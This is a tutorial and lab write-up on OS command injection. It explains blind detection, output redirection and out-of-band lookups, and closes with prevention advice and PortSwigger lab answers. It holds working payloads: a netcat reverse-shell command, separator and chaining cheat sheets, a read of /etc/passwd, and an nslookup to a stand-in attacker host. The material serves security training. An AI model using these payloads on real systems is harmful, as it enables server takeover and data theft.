# OS Command Injection

## OS Command Injection



[writeups](/broken/pages/58da3e23d5855eae4a53fd35078610e8aa3255b5)

## What is command Injection?

OS command injection (also known as shell injection) is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.

### Mechanism

In OS Command Injection, the attacker can execute OS commands on the server operating system through a web parameter delivered by the user, by a specific header in a request, or through cookies.

For example, an application provides a DNS lookup service and takes the subdomain value from the user.

![Capture.PNG](<../../.gitbook/assets/Capture (1).png>)

It delivers user input through the `target` parameter to the backend and passes the parameter value to the following code:

```bash
shell_exec("nslookup  " . commandi($target))
```

We notice here the code has no sanitization, so the attacker can inject OS commands by separating the original command and payload with `;`, `||`, or `&&`.

{% hint style="info" %}
Depending on **where your input is being injected**, you may need to **terminate the quoted context** using `"` or `'` before the commands.
{% endhint %}

```bash
# Request

target=example.com;whoami&form=submit
```

The result will be the lookup result for `example.com` and the current OS user.

{% hint style="info" %}
NOTE: You can inject OS commands on Windows or Unix-based systems according to the server operating system.
{% endhint %}

***

### Simple OS command injection

Here, we can see the output of injecting OS commands via the HTTP response, as in the previous example.

### Blind OS command injection

When an application is vulnerable to OS command injection but the result of commands does not return in the HTTP response, we call it “blind OS command injection”. It can be exploited using the following techniques.

#### Detecting blind OS command injection using time delays

We can use the time-delay technique to confirm a vulnerable application. The following commands cause a time delay:

```bash
& ping -c 10 127.0.0.1 &
& sleep 10 &
```

Example: [https://medium.com/@ashkrypt/blind-os-command-injection-87910f0d2276](https://medium.com/@ashkrypt/blind-os-command-injection-87910f0d2276)

#### Exploiting blind OS command injection by redirecting output

If the application serves static resources from the filesystem location `/var/www/static`, we can redirect the result of a command to this directory. After injecting the command, we can get the result by visiting `site.com/directory`.

Payload:

```bash
& whoami > /var/www/static/whoami.txt &
```

#### Exploiting blind OS command injection using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques

You can use an injected command that triggers an out-of-band network interaction with a system that you control using OAST techniques. For example:

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

***

### Get reverse shell using netcat tool

{% stepper %}
{% step %}
### Set a netcat listener

Set a netcat listener on your machine:

```bash
nc -l -p 1234   # set a continous listener on port 1234
```
{% endstep %}

{% step %}
### Insert the payload

Insert the following payload to connect to your machine:

```bash
vulnerable_parameter=1 & nc "my machine ip" 1234 -e /bin/sh &
```
{% endstep %}
{% endstepper %}

And boom, we get the shell.

{% hint style="info" %}
For useful bypass technics, visit [https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions](https://book.hacktricks.xyz/linux-hardening/bypass-bash-restrictions).
{% endhint %}

{% hint style="info" %}
For an automation tool, you can use the “commix” tool.
{% endhint %}

#### Some injection cases based on OS

```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful
0x0a**ls**   # new line
****/n **ls**

#Not executed but may be interesting (used in blind os command ijection )
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```

#### Some parameters potentially vulnerable

```bash
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```

***

### How to prevent

The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code.

There are more techniques for prevention:

{% stepper %}
{% step %}
### Escape values added to OS commands specific to each OS

For example, using `escapeshellarg()` in PHP surrounds user input in single quotes so only the original command will be executed.
{% endstep %}

{% step %}
### Parameterization in conjunction with Input Validation

For example, separate data and commands by validating based on a blacklist of characters or a whitelist of commands.
{% endstep %}
{% endstepper %}

### Labs

#### Lab 1: Simple case

```sql
|+whoami+|
```

#### Lab 2: **Blind OS** [**command injection**](https://portswigger.net/web-security/os-command-injection) **with time delays**

```sql
 ||+ping+-c+10 127.0.0.1+||      //  ctrl + u
 &+sleep+10+&                   //  ctrl +u
```

#### Lab 3: **Blind OS command injection with output redirection**

```sql
||+whoami+>+/var/www/images/who.txt+||
```
